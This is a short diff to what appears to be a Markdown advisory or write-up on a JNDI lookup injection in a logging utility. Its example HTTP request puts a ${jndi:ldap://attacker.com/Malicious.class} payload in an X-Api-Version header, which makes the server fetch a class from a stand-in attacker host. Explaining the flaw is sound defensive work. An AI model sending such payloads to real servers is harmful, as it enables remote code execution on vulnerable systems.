@@ -57,7 +57,7 @@ log file:
 
 ```
 GET /health
-X-Api-Version: ${'{'{'}'}jndi:ldap://attacker.com/Malicious.class{'}'}
+X-Api-Version: $｛jndi:ldap://attacker.com/Malicious.class｝
 ```
 
 Due to the insecure default configuration of the logging utility and a
